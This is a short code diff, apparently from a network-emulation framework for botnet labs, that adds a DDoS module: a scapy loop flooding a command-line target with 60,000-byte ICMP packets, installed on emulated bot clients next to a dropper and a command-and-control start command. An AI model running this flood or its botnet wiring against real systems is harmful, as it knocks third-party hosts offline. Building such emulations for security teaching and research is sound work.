@@ -48,6 +48,17 @@ while True:
 
 """
 
+
+BotnetServerFileTemplates['ddos_module'] = """from scapy.all import *
+import sys
+
+target = sys.argv[1]
+
+while True:
+    ip_hdr = IP(dst=target)
+    packet = ip_hdr/ICMP()/("m"*60000) #send 60k bytes of junk
+    send(packet)"""
+
 DGA_DEFAULT_FUNCTION = """
 def dga() -> list:
     #Generate 10 domains for the given time.
@@ -168,7 +179,9 @@ class BotnetClientServer(Server):
         # self.__node.addBuildCommand('curl https://bootstrap.pypa.io/get-pip.py -o /tmp/get-pip.py')
         # self.__node.addBuildCommand('python2 /tmp/get-pip.py')
         node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt')
+        node.addBuildCommand('pip3 install scapy')
         node.setFile('/tmp/BotClient.py', self.__dropper)
+        node.setFile('/tmp/ddos.py', BotnetServerFileTemplates['ddos_module'])
         node.appendStartCommand(BotnetServerFileTemplates['start_command'].format(C2ServerIp = self.__c2_server_ip))
 
     def print(self, indent: int) -> str:
